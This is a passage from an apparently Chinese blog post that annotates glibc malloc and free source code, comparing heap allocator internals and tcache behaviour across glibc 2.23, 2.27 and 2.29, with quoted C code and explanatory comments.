class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;      <span class="comment">//如果该chunk不在fastbin范围里</span></span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">malloc_consolidate(av);            <span class="comment">//整理fastbin</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_CANNOT_TRIM       </span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.trim_threshold))</span><br><span class="line">  systrim(mp_.top_pad, av);        <span class="comment">//收缩堆</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">   large, because the corresponding heap might go away.  */</span></span><br><span class="line">heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">assert(heap-&gt;ar_ptr == av);</span><br><span class="line">heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      assert (locked);</span><br><span class="line">      (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;            <span class="comment">//如果chunk是mmap得到的，那就调用munmap_chunk</span></span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除非有报错，正常情况下<code>_int_free</code>会重头执行到尾</p><p>过程：fastbin-&gt;合并-&gt;unsorted bin-&gt;整理堆块</p><h1 id="glibc-2-27"><a href="#glibc-2-27" class="headerlink" title="glibc-2.27"></a>glibc-2.27</h1><p>最大的区别就是2.26加了一个tcache</p><p>先来了解一些tcache的调用</p><h2 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h2><h3 id="tcache结构体"><a href="#tcache结构体" class="headerlink" title="tcache结构体"></a>tcache结构体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread <span class="type">bool</span> tcache_shutting_down = <span class="literal">false</span>;</span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282213186.png" alt="image-20240229125649925"></p><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从tcache取出一个对应的块</p><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将chunk放入对应的tcache</p><h2 id="libc-malloc-1"><a href="#libc-malloc-1" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;f</span><br><span class="line">  <span class="title function_">if</span> <span class="params">(tc_idx &lt; mp_.tcache_bins</span></span><br><span class="line"><span class="params">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span></span><br><span class="line"><span class="params">      &amp;&amp; tcache</span></span><br><span class="line"><span class="params">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在<code>__libc_malloc</code>里多了tcache的操作，可以直接在<code>__libc_malloc</code>获得chunk返回</p><p>并且多了SINGLE_THREAD_P判定，即是否为单线程，如果为单线程，就直接调用_int_malloc分配chunk，之后进行断言检查</p><h2 id="int-malloc-1"><a href="#int-malloc-1" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><h3 id="fastbin-1"><a href="#fastbin-1" class="headerlink" title="fastbin"></a>fastbin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REMOVE_FB(fb, victim, pp)\</span></span><br><span class="line"><span class="meta">  do\</span></span><br><span class="line"><span class="meta">    &#123;\</span></span><br><span class="line"><span class="meta">      victim = pp;\</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (victim == NULL)\</span></span><br><span class="line"><span class="meta">break;\</span></span><br><span class="line"><span class="meta">    &#125;\</span></span><br><span class="line"><span class="meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) != victim);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)    </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = victim-&gt;fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    REMOVE_FB (fb, pp, victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment"> stash them in the tcache.  */</span></span><br><span class="line">      <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li><p>fastbin移除形式增加至两种</p><ul><li>如果为单线程<code>SINGLE_THREAD_P</code>那么就<code>*fb = victim-&gt;fd;</code>直接移除</li><li>如果不是<code>SINGLE_THREAD_P</code>那么就调用REMOVE_FB宏就是glibc2.23的正常移除形式</li></ul></li><li><p>新增fastbin填充tcache机制,当从fastbin中取出chunk后,如果该fastbin中还有剩余chunk,且对应tcache中有剩余空间,则会将fastbin中的chunk移入tcachebin</p></li></ul><h3 id="smallbin"><a href="#smallbin" class="headerlink" title="smallbin"></a>smallbin</h3><p>首先去除了smallbin未初始化就触发<code>malloc_consolidate</code>机制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)  <span class="comment">//tcache存在，且tc_idx对应的tcache存在</span></span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count  <span class="comment">//no full</span></span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)            <span class="comment">//链表有多个节点</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);   <span class="comment">//把相应的chunk放到tcache</span></span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>smallbin同样新增tcache填充机制,当从smallbin中取出chunk后,如果该smallbinbin中还有剩余chunk,且对应tcache中有剩余空间,则会将smallbin中的chunk移入tcachebin</p><p><strong>注意</strong>填充过程中是没有对smallbin的完整性进行检查的</p><h3 id="大循环-1"><a href="#大循环-1" class="headerlink" title="大循环"></a>大循环</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = <span class="number">0</span>;</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    tcache_nb = nb;</span><br><span class="line">  <span class="type">int</span> return_cached = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>设置参数</p><h3 id="unsorted-bin-1"><a href="#unsorted-bin-1" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment"> We may return one of these chunks later.  */</span></span><br><span class="line">      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">//如果unsortedbin的符合tcache条件</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_put (victim, tc_idx);   <span class="comment">//放到tcache里</span></span><br><span class="line">  return_cached = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>如果unsortedbin找到的符合tcache，那么先放到tcache里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span></span><br><span class="line"><span class="comment"> filling the cache, return one of the cached ones.  */</span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>在unsortedbin遍历结束后，会再进行判定，如果已经找到符合条件的chunk就直接返回</p><h2 id="libc-free-1"><a href="#libc-free-1" class="headerlink" title="__libc_free"></a>__libc_free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MAYBE_INIT_TCACHE ();</span><br></pre></td></tr></table></figure><p>增加了tcache初始化判定，没有则初始化</p><h2 id="int-free-1"><a href="#int-free-1" class="headerlink" title="_int_free"></a>_int_free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>tcache有位置，则先放在tcache里(优先级最高MAX)</p><h3 id="fastbin-2"><a href="#fastbin-2" class="headerlink" title="fastbin"></a>fastbin</h3><p>发生了与malloc相似的变化，free了一个fast chunk如果fastbin里还有，都放到tcache里</p><h1 id="glibc-2-29"><a href="#glibc-2-29" class="headerlink" title="glibc-2.29"></a>glibc-2.29</h1><h2 id="tcache-1"><a href="#tcache-1" class="headerlink" title="tcache"></a>tcache</h2><p>结构体新增了一个成员key</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><h2 id="libc-malloc-2"><a href="#libc-malloc-2" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h2><p>无变化</p><h2 id="int-malloc-2"><a href="#int-malloc-2" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><p>新增了一些检查</p><h3 id="大循环-2"><a href="#大循环-2" class="headerlink" title="大循环"></a>大循环</h3><p>大循环开头</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">  || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))   <span class="comment">//next的size合法性</span></span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))   <span class="comment">//标志位</span></span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)                <span class="comment">//victim-&gt;bk-&gt;fd==victim</span></span><br><span class="line">  || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next))) </span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br></pre></td></tr></table></figure><p>分割判定后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))     <span class="comment">//victim-&gt;bk-&gt;fd==victim</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="libc-free-2"><a href="#libc-free-2" class="headerlink" title="__libc_free"></a>__libc_free</h2><p>无变化</p><h2 id="int-free-2"><a href="#int-free-2" class="headerlink" title="_int_free"></a>_int_free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">     tmp;</span><br><span class="line">     tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">    <span 